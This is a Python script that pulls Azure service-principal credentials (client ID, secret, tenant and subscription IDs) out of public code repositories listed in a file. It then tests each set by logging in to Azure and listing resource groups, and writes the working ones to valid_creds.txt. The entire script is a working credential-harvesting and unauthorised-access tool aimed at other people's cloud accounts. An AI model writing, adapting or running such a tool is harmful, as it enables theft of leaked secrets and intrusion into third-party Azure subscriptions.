import requests
import json
from azure.cli.core import get_default_cli
from azure.identity import ClientSecretCredential
from azure.mgmt.resource import ResourceManagementClient

search_strs = ["client_id" , "client_secret", "tenant_id" , "subscription_id"]

with open('azure_repo.txt', 'r') as file:
    for line in file:
        # Process each line here
        url = line.strip()

        response = requests.get(url)
        if response.status_code == 200:
        	client_id = ""
        	client_secret = ""
        	tenant_id = ""
        	subscription_id = ""
        	
        	text = json.loads(response.text)
        	lines = text['payload']['blob']['rawLines']
        	for search_str in search_strs:
        		for line in lines:
        			if search_str in line.lower() and not 'var' in line.lower() and not 'data' in line.lower() and not 'variable' in line.lower() and not 'env' in line.lower() and not 'azure' in line.lower() and not 'output' in line.lower() and not 'module' in line.lower() and not 'arm' in line.lower() and not 'resource' in line.lower()  and not 'xxx' in line.lower() and not '$' in line.lower() and not 'local' in line.lower():
        				if search_str == "client_id":
        					client_id = line.lstrip('#')
        					client_id = client_id.replace("client_id", "")
        					client_id = client_id.replace("=", "")
        					client_id = client_id.replace('"', "").strip()
        					# print(client_id)

        				if search_str == "client_secret":
        					client_secret = line.lstrip('#')
        					client_secret = client_secret.replace("client_secret", "")
        					client_secret = client_secret.replace("=", "")
        					client_secret = client_secret.replace('"', "").strip()
        					# print(client_secret)

        				if search_str == "tenant_id":
        					tenant_id = line.lstrip('#')
        					tenant_id = tenant_id.replace("tenant_id", "")
        					tenant_id = tenant_id.replace("=", "")
        					tenant_id = tenant_id.replace('"', "").strip()
        					# print(tenant_id)

        				if search_str == "subscription_id":
        					subscription_id = line.lstrip('#')
        					subscription_id = subscription_id.replace("subscription_id", "")
        					subscription_id = subscription_id.replace("=", "")
        					subscription_id = subscription_id.replace('"', "").strip()
        					# print(subscription_id)

        	if (len(client_id) > 25 and len(client_secret) > 15 and len(tenant_id) > 25):
        		try:
	        		print("#########################################################################################################")
	        		print(url)
	        		print(client_id)
	        		print(client_secret)
	        		print(tenant_id)
	        		print(subscription_id)
	        		credential = ClientSecretCredential(tenant_id, client_id, client_secret)
	        		resource_client = ResourceManagementClient(credential, subscription_id)
	        		try:
	        			for resource_group in resource_client.resource_groups.list():
	        				break

	        			with open("valid_creds.txt", "a") as f:
	        				f.write('client_id = "' + client_id+'"'+"\n")
	        				f.write('client_secret = "'+ client_secret+'"'+"\n")
	        				f.write('tenant_id = "'+tenant_id+'"'+"\n")
	        				f.write('subscription_id = "'+subscription_id+'"'+"\n")
	        				f.write("Login Success"+"\n")
	        			print("login success")
	        		except:
	        			pass
	        	except: 
	        		pass


